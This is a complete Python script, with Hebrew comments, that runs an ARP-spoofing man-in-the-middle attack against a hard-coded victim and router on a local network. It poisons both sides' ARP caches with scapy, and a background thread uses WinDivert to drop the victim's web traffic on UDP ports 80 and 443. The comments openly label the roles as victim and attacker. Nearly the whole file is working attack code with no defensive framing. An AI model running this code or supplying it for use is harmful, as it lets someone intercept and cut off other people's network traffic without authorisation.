import os
import multiprocessing
from getmac import get_mac_address
from scapy.all import srp, send
from scapy.layers.l2 import Ether, ARP
from pydivert import WinDivert
import threading
import time

# פונקצייה ששולחת הודעות ARP לראוטר\מכשיר
def spoof(target_ip, host_ip, attacker_ip, verbose=True):
    target_mac = get_mac_address(ip=target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0, count=7)
    if verbose:
        self_mac = get_mac_address(ip=attacker_ip)
        print(f"[+] Sent to {target_ip} : {host_ip} is-at {self_mac}")

# פונקצייה שמחזירה את המצב לקדמותו
def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac_address(ip=target_ip)
    host_mac = get_mac_address(ip=host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    send(arp_response, verbose=0, count=7)
    if verbose:
        print(f"[+] Sent to {target_ip} : {host_ip} is-at {host_mac}")

# פונקצייה שחוסמת את הפקטות
def block_traffic(filter_rule="ip and (udp.DstPort == 443 or udp.DstPort == 80)"):
    with WinDivert(filter_rule) as w:
        print("[*] Blocking started...")
        for packet in w:
            print(f"[BLOCKED] {packet.src_addr} -> {packet.dst_addr}")
            # לא שולחים את הפקטה
            pass



if __name__ == "__main__":
    # כתובות IP של הקורבן, הראוטר והתוקף
    target = "192.168.1.238"
    host = "192.168.1.1"
    attacker = "192.168.1.100"
    verbose = True

    # התחלת חסימת תעבורה ברקע
    traffic_blocker = threading.Thread(target=block_traffic, daemon=True)
    traffic_blocker.start()

    try:
        while True:
            # אומרים לקורבן שאנחנו הראוטר
            spoof(target, host, attacker, verbose)
            # אומרים לראוטר שאנחנו הקורבן
            spoof(host, target, attacker, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! Restoring network...")
        restore(target, host)
        restore(host, target)
